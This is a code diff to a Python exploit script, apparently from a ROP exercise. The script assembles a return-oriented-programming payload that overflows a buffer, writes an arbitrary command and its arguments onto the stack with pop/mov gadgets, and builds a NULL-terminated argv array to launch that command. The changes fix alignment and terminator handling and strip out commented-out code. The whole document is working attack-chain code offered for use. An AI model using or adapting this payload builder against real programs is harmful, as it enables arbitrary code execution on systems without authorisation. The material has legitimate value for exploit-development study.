@@ -193,7 +193,7 @@ args = command_line[1:]
 p = bytes('A' * padding, 'ascii')
 
 # ===================================================================================
-# *filename section
+# *filename SECTION
 # ===================================================================================
 
 # we'll use this to point to the right location on stack
@@ -201,7 +201,8 @@ stack_addr_pointer = 0
 
 exec_correct_length = len(exec) % 4
 if exec_correct_length != 0:
-    exec = '/' * (4 - exec_correct_length) + exec
+    # *filename can start with / or ./
+    exec = exec[0] + '/' * (4 - exec_correct_length) + exec[1:]
     print('command: ', exec, '\n')
 
 for _ in range(int(len(exec)/4)):
@@ -219,15 +220,20 @@ for _ in range(int(len(exec)/4)):
 
 # push a NULL onto the stack after command is on stack 
 p += pushNULLbyOffset(stack_addr_pointer)
-stack_addr_pointer += 1
+
+# this puts a NULL pointer after the exec, however if we supply arguments,
+# we just need a \0 so we can start writing 1 byte after exec
+if len(args) != 0:
+    stack_addr_pointer += 1
 
 # ===================================================================================
-# *argv[] section
+# *argv[] SECTION
 # ===================================================================================
 
 arg_addresses = {exec : STACKADDR}
+args_len = len(args)
 
-for i in range(len(args)):
+for i in range(args_len):
     arg = args[i]
     arg_addresses[arg] = STACKADDR + stack_addr_pointer
     arg_correct_length = len(arg) % 4
@@ -258,62 +264,29 @@ for i in range(len(args)):
             stack_addr_pointer += arg_correct_length
         else:
             stack_addr_pointer += 4
-        print('stack_pointer_after: ', stack_addr_pointer, '\n')
-    print('point: ', stack_addr_pointer, '\n')
-    p += pushNULLbyOffset(stack_addr_pointer)
-    stack_addr_pointer += 1
 
-stack_addr_pointer -= 1 # we want to point at address containing full \0
+    p += pushNULLbyOffset(stack_addr_pointer)
+    if i != args_len - 1:
+        stack_addr_pointer += 1
+
+# *argv[] needs last elemnt to be NULL pointer 
 arg_addresses['NULL'] = STACKADDR + stack_addr_pointer
 
 # print('--------------------------------------\n')
 # pp.pprint(arg_addresses)
-# uncomment for working code 
-
-# p += POPDST
-# # put stack address to the destination register which we got from the mov gadget
-# p += pack("<I", STACKADDR + stack_addr_pointer)
-# p += addPadding(rop_gadgets['popDst'][1], {})
-
-# p += POPSRC
-# p += b'-lpp'
-# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: stack_addr_pointer})
-
-# p += MOV
-# p += addPadding(rop_gadgets['mov'][1], {})
-# stack_addr_pointer += 2
-
-# print('point: ', stack_addr_pointer, '\n')
-# p += pushNull(stack_addr_pointer)
-# stack_addr_pointer += 1
-
-# p += POPDST
-# # put stack address to the destination register which we got from the mov gadget
-# p += pack("<I", STACKADDR + stack_addr_pointer)
-# p += addPadding(rop_gadgets['popDst'][1], {})
-
-# p += POPSRC
-# p += b'-app'
-# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: stack_addr_pointer})
-
-# p += MOV
-# p += addPadding(rop_gadgets['mov'][1], {})
-# stack_addr_pointer += 2
-
-# print('point: ', stack_addr_pointer, '\n')
-# p += pushNull(stack_addr_pointer)
 
 # ===================================================================================
-# *envp[] section
+# SHADOW STACK SECTION
 # ===================================================================================
 
-# shadow stack
-# print('NULL before: ', arg_addresses['NULL'] + 4, '\n')
 shadow_stack_address = arg_addresses['NULL'] + 4
 arg_addresses['SHADOW_STACK'] = shadow_stack_address
-# p += pushNULLonAddress(shadow_stack_address) # possibly not necessary
 
-for i in range(len(command_line)):
+comm_len = len(command_line)
+for i in range(comm_len):
+
+    p += pushNULLonAddress(shadow_stack_address)
+
     p += POPDST
     p += pack("<I", shadow_stack_address)
     p += addPadding(rop_gadgets['popDst'][1], {})
@@ -327,45 +300,10 @@ for i in range(len(command_line)):
 
     p += MOV
     p += addPadding(rop_gadgets['mov'][1], {})
-    shadow_stack_address += 4
-shadow_stack_address -= 4
+    if i != comm_len - 1:
+        shadow_stack_address += 4
 
-# p += POPDST
-# p += pack("<I", shadow_stack_address)
-# p += addPadding(rop_gadgets['popDst'][1], {})
-
-# p += POPSRC
-# p += pack('<I', arg_addresses[exec])
-# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_stack_address})
-
-# p += MOV
-# p += addPadding(rop_gadgets['mov'][1], {})
-# shadow_stack_address += 4
-
-# p += POPDST
-# p += pack("<I", shadow_stack_address)
-# p += addPadding(rop_gadgets['popDst'][1], {})
-
-# p += POPSRC
-# p += pack('<I', arg_addresses[args[0]])
-# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_stack_address})
-
-# p += MOV
-# p += addPadding(rop_gadgets['mov'][1], {})
-# shadow_stack_address += 4
-
-# p += POPDST
-# p += pack("<I", shadow_stack_address)
-# p += addPadding(rop_gadgets['popDst'][1], {})
-
-# p += POPSRC
-# p += pack('<I', arg_addresses[args[1]])
-# p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: shadow_stack_address})
-
-# p += MOV
-# p += addPadding(rop_gadgets['mov'][1], {})
-
-# TODO: put a null after
+# NULL pointer
 p += pushNULLonAddress(shadow_stack_address + 4)
 
 p += POPB
